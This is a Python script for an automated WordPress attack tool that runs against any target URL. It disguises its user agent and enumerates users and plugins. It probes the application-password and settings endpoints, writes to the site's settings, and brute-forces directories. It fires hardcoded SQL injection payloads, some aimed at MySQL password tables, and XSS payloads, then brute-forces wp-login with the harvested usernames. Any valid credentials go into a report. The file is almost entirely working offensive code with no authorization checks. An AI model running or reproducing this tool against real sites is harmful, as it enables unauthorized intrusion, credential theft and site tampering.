import requests
from faker import Faker
from colorama import init, Fore
from selenium import webdriver
from selenium.webdriver import Firefox
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import argparse
import time
import random


init(autoreset=True)

wordpress_version_found = [] 
found_plugins = [] 
useful_urls = [] 
found_routes = [] 
found_users = [] 
found_slugs = []
password_leak = [] 
writeable = [] 
sub_urls = [] 
sql_vun = [] 
security_header = [] 
found_creds = [] 

def fake_useragent():
    fake = Faker()
    Faker.seed(5)
    user_agents = [fake.user_agent() for _ in range(10)]
    return random.choice(user_agents)

headers = {
            'User-Agent' : fake_useragent(),
            'Accept-Language' : 'en-US,en;q=0.9',
            'Accept-Encoding' : 'gzip, deflate, br',
            'Connection' : 'keep-alive',
            'Upgrade-Insecure-Requests' : '1'
           }

def driver_settings():
    options = Options()
    options.add_argument("--headless")
    driver = webdriver.Firefox(options)
    return driver

def wordpress_version(target_url):
    web_drive = driver_settings()
    web_drive.get(target_url)
    try:
        for meta in web_drive.find_elements(By.NAME, 'generator'):
            if meta:
                wordpress_version_found.append(f"{meta.get_attribute('content')}")
                print(Fore.GREEN + f"[+] version: {meta.get_attribute('content')}")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")
    finally:
        web_drive.quit()

def detect_plugins(response_data):
    try:
        for plugin in response_data.get('namespaces', []):
            found_plugins.append(plugin)
            print(Fore.GREEN + f"[+] Plugin namespace: {plugin}")
            time.sleep(0.60)
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def check_plugin_cves_nvd():
    web_drive = driver_settings()
    for plugin in found_plugins:
        print(Fore.CYAN + f"[*] {plugin}")
        web_drive.get(f"https://duckduckgo.com/?t=lm&q={plugin.replace("/", "%2F")}+exploit&ia=web")
        for link in web_drive.find_elements(By.CLASS_NAME, 'eVNpHGjtxRBq_gLOfGDr'):
            print(Fore.GREEN + f"[+] {link.get_attribute('href')}")
            useful_urls.append(link.get_attribute("href"))
        import time
        time.sleep(0.60)     
    web_drive.quit()

def scan_routes(target_url, routes):
    try:
        for route in routes:
            print(Fore.GREEN + f"[+] Route: {route}")
            found_routes.append(route) 

            if route == '/wp/v2/users': # if the users route is found
                print(Fore.YELLOW + "[!] User endpoint found. Enumerating...")
                enumerate_users(target_url)

            if route.startswith('/wp/v2/settings'):
                print(Fore.YELLOW + "[!] Settings endpoint found. Checking GET...")
                check_get_settings(target_url)

            time.sleep(0.60)
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def enumerate_users(target_url):
    try:
        target = f"{target_url}/wp-json/wp/v2/users"
        url = requests.get(target, headers=headers)
        if url.status_code == 200:
            users = url.json()
            for user in users:
                user_uid = user.get("id")
                user_username = user.get("slug")
                print(Fore.GREEN + f"[+] Found user ID: {user_uid}, slug: {user_username}")
                found_users.append(f"{user_username}:{user_uid}") # appends the users found
                found_slugs.append(user_username)
                print(Fore.YELLOW + "[!] Checking Possible Password Leaks!")
                check_app_passwords(target_url, user_uid)
                time.sleep(0.60)
        else:
            print(Fore.RED + "[-] User enumeration failed.")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def check_app_passwords(target_url, user_id):
    try:
        target = f"{target_url}/wp-json/wp/v2/users/{user_id}/application-passwords"
        url = requests.get(target, headers=headers)
        print(Fore.RED + f"[-] Checked user ID {user_id} - Status: {url.status_code} - url {target}")
        if url.status_code == 200:
            print(Fore.GREEN + f"[+] Possible app password leak for user ID {user_id}!")
            password_leak.append(target)
    except Exception as e:
        print(Fore.RED + f'[-] Error {e}')

def check_get_settings(target_url):
    try:
        url = f"{target_url}/wp-json/wp/v2/settings"
        r = requests.get(url, headers=headers)
        print(Fore.RED + f"[-] Settings GET status: {r.status_code}")
        if r.status_code == 200:
            print(Fore.GREEN + "[+] Public settings exposed!")
            print(Fore.WHITE + f"{r.json()}")
            check_post_settings(target_url)
        return print(Fore.YELLOW + "[!] Public settings not exposed!")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def check_post_settings(target_url):
    try:
        url = f"{target_url}/wp-json/wp/v2/settings"
        payload = {"title": "Z∑r0$um"}
        r = requests.post(url, headers=headers, json=payload)
        if r.status_code in [200, 201]:
            print(Fore.GREEN + f"[+] POST status: {r.status_code} - Writeable settings!")
            writeable.append(url + r.status_code)
        else:
            print(Fore.RED + f"[-] POST blocked ({r.status_code})")
    except Exception as e:
        print(Fore.RED + f"[-] Error {e}")

def dir_force(target_url, sub_list=None): # add threading
    if sub_list:
        with open(sub_list, "r") as file:
            for dir in file:
                response = requests.get(f"{target_url}/{dir}")
                if response.status_code == 200:
                    print(Fore.GREEN + f"[+] Found: {target_url}/{dir}".replace("\n", ""))
                    sub_urls.append(f"{target_url}/{dir}")
                else:
                    continue
    elif sub_list == None:
        common_dirs = ['/wp-admin', '/wp-content', '/wp-includes', '/wp-json', '/readme.html', '/license.txt', '/wp-config.php']
        for dir in common_dirs:
            response = requests.get(target_url + dir)
            if response.status_code == 200:
                print(Fore.GREEN + f"[+] Found: {target_url}{dir}")
                sub_urls.append(f"{target_url}{dir}")
            else:
                continue

def test_sqli(target_url, sql_list=None):
    if sql_list:
        with open(sql_list, 'r') as file:
            for payload in file:
                try:
                    response = requests.get(f"{target_url}/page.php?id={payload.replace("%20", "".lstrip())}", timeout=10, headers=headers)
                    if "sql" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                        print(Fore.GREEN + f"[+] Possible SQLi vulnerability found with payload: {payload}")
                        sql_vun.append(payload)
                except requests.exceptions.Timeout:
                    print(Fore.YELLOW + f"[!] Possible time-based SQLi with payload: {payload} (timeout)")
                except Exception as e:
                    print(Fore.RED + f"[ERROR] Request failed: {e}")
            print(Fore.YELLOW + f"[!] No SQLi detected against target!")
            # sql_vun.append("No Common SQLi detected against target!")
    else:
        payloads = [
            "' OR '1'='1",
            "' OR 1=1 --",
            "' OR 'a'='a",
            "'; WAITFOR DELAY '0:0:5' --",
            "' OR SLEEP(5) --",
            "' UNION SELECT NULL, NULL, NULL --",
            "' AND 1=1 --",
            "'SELECT User,Password FROM mysql.user;",
            "'SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = 'root';"
            "'SELECT password,USER() FROM mysql.user;"
        ]
        for payload in payloads:
            try:
                response = requests.get(f"{target_url}/page.php?id={payload.replace("%20", "".lstrip())}", timeout=10, headers=headers)
                if "sql" in response.text.lower() or "mysql" in response.text.lower() or "syntax" in response.text.lower():
                    print(Fore.GREEN + f"[+] Possible SQLi vulnerability found with payload: {payload}")
                    sql_vun.append(payload)
            except requests.exceptions.Timeout:
                print(Fore.YELLOW + f"[!] Possible time-based SQLi with payload: {payload} (timeout)")
            except Exception as e:
                print(Fore.RED + f"[ERROR] Request failed: {e}")
        print(Fore.YELLOW + f"[!] No Common SQLi detected against target!")
        # sql_vun.append("No Common SQLi detected against target!")

def security_headers(target_url):
    response = requests.get(target_url)
    headers = response.headers
    security_headers = [
        'Strict-Transport-Security', 
        'X-Content-Type-Options', 
        'Content-Security-Policy',
        'X-XSS-Protection', 
        'X-Frame-Options'
    ]
    try:
        for header in security_headers:
            if header not in headers:
                print(Fore.GREEN + f"[+] Missing Security Header (Possible Finding): {header}")
                security_header.append(header)
            else:
                print(Fore.YELLOW + f"[-] Header Present: {header} = {headers[header]}")
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[!] Error accessing {target_url}: {e}")

def xss_testing(target_url):
    xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert(1)>"
    ]

    for payload in xss_payloads:
        response = requests.get(f"{target_url}?search={payload}")
        if payload in response.text:
            print(Fore.GREEN + f"[+] Possible XSS vulnerability with payload: {payload}")
    print(Fore.RED + f"[-] Not Vun to Common XSS")

def brute_login_wp(target_url, password_list):
    login_url = f"{target_url}/wp-login.php"
    for user in found_slugs:
        for pwd in password_list:
            data = {'log': user, 'pwd': pwd.strip()}
            r = requests.post(login_url, data=data, headers=headers, allow_redirects=False)
            if "location" in r.headers and "wp-admin" in r.headers["location"]:
                found_creds.append(f"{user} : {pwd}")
                print(Fore.GREEN + f"[+] VALID LOGIN: {user}:{pwd.strip()}")
                break
            else:
                print(Fore.RED + f"[-] Failed login: {user}:{pwd.strip()}")

def writing_work(output_file):
    try:
        with open(f"{output_file}", "w+") as f:
            f.write("####################\nWordpress Version\n####################\n")
            f.write(f"{wordpress_version_found}" + "\n")

            f.write("\n####################\nPlugins\n####################\n")
            for plugin in found_plugins:
                f.write(plugin + "\n")

            f.write("\n####################\nUseful Links\n####################\n")
            for result in useful_urls:
                f.write(result + "\n")

            f.write("\n####################\nRoutes\n####################\n")
            for route in found_routes:
                f.write(route + "\n")

            f.write("\n####################\nusernames\n####################\n")
            for username in found_users:
                f.write(username + "\n")

            f.write("\n####################\nWritable Exploits\n####################\n")
            for write in writeable:
                f.write(write + "\n")

            f.write("\n####################\nSub Folders\n####################\n")
            for subfolder in sub_urls:
                f.write(subfolder + "\n")

            f.write("\n####################\nSQLi\n####################\n")
            for vun in sql_vun:
                f.write(vun + "\n")

            f.write("\n####################\nSecurity Headers\n####################\n")
            for header in security_header:
                f.write(header + "\n")

            f.write("\n####################\nFound Creds\n####################\n")
            for cred in found_creds:
                f.write(cred + "\n")

    except Exception as e:
        print("Error man")

def scan_type(target_url, sub_list=None, sql_list=None, password_file=None, output_file=None):
    print(Fore.CYAN + f"[*] Starting scan on {target_url}")
    try:
        wordpress_version(target_url)
    except Exception as e:
        print(Fore.RED + f"Error {e}")
    r = requests.get(f"{target_url}/wp-json", headers=headers)
    if r.status_code == 200:
        data = r.json()
        if data.get("timezon_string") in data:
            print(Fore.GREEN + f"[+] Timezone: {data.get('timezone_string')}")
        else:
            print(Fore.RED + f"[-] Timezone: Not Found")
    print(Fore.CYAN + f"[*] Scanning {target_url} for plugins")
    detect_plugins(data)
    print(Fore.CYAN + "[*] Scraping for plugin Exploits")
    check_plugin_cves_nvd()
    print(Fore.CYAN + f"[*] Scanning {target_url} for Routes")
    scan_routes(target_url, data.get('routes', {}))
    if sub_list:
        print(Fore.CYAN + f"[*] Scanning {target_url} SubFolders using {sub_list}")
        dir_force(target_url, sub_list)
    else:
        print(Fore.CYAN + f"[*] Scanning {target_url} SubFolders using common folders!")
        dir_force(target_url, sub_list=None)
    if sql_list:
        print(Fore.CYAN + f"[*] Sql Test {target_url} using {sql_list}")
        test_sqli(target_url, sql_list)
    else:
        print(Fore.CYAN + f"[*] Testing {target_url} for SQL injection...")
        test_sqli(target_url, None)
    print(Fore.CYAN + "[*] Scanning for security headers")
    security_headers(target_url)
    print(Fore.CYAN + "[*] Testing XSS Vunrablilties")
    xss_testing(target_url)
    if password_file:
        with open(password_file, "r", encoding="utf-8") as f:
            pwds = [p.strip() for p in f]
        print(Fore.CYAN + f"[*] Starting brute force with {len(pwds)} passwords...")
        brute_login_wp(target_url, pwds)
    if output_file:
        writing_work(output_file)

def scan_target():
    parser = argparse.ArgumentParser()
    parser.add_argument('-target', '--target', required=True, help='Target site (e.g., https://example.com)')
    parser.add_argument('-sD', '--sub_list', required=False, help='Sub Dir List for brute force')
    parser.add_argument('-sI', '--sql_list', required=False, help='List for Sql Injection')
    parser.add_argument('-p', '--file', required=False, help='Password file for brute force')
    parser.add_argument('-o','--output',required=False, help='output file eg. /path/to/named_file.txt')
    args = parser.parse_args()
    scan_type(args.target.rstrip('/'), args.sub_list, args.sql_list, args.file, args.output)

if __name__ == '__main__':
    scan_target()
